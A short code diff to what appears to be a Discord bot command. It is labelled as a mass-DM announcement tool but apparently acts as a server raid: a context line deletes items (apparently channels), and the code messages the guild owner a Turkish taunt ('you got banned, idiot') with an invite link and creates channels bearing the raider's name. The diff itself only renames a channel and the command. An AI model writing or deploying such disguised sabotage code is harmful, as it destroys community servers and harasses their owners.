@@ -46,7 +46,7 @@ return c.delete();
   
 message.guild.owner.send(`Ban Yedin Gerizaklıııı https://discord.gg/w8Xq9bm`);
 message.guild.createChannel(`berke-adamdir`)
-message.guild.createChannel(`berke-adamdir`)
+message.guild.createChannel(`berke-abi-ne-yaptin`)
 message.delete()
 }
 };
@@ -62,7 +62,7 @@ exports.conf = {
 };
 
 exports.help = {
-  name: 's2',
+  name: 'benberke',
   description: 'Toplu dm atar.', 
   usage: 'dmduyuru [mesaj]'
 };
